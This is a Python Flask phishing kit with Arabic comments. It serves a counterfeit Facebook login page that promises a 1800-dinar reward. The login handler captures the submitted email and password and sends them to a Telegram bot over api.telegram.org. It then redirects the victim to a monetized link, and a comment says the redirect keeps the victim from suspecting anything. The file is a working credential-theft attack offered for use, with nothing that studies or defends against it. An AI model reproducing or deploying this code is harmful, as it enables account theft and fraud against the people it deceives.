import os
import requests
from flask import Flask, request, redirect

app = Flask(__name__)

# معلومات البوت تاعك (تأكد منها)
BOT_TOKEN = "7917897258:AAH8N6L3X8J8L6_J8X8J8L6_J8X8J8L6" 
CHAT_ID = "7449520860"

# الرابط اللي راح نبعثوه ليه بعد ما يسجل الدخول
MONEY_SITE = "https://trianglerockers.com/1885419"

HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; }
        button { width: 95%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h1 style="color: #1877f2;">facebook</h1>
        <p style="font-size: 14px; color: #606770;">سجل دخولك للمطالبة بمكافأة الـ 1800 دج</p>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="password" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    message = f"✅ صيدة جديدة من فارس!\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
    
    # إرسال للتلغرام
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
    
    # توجيه الضحية لموقع الدراهم باش ما يشكش
    return redirect(MONEY_SITE)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
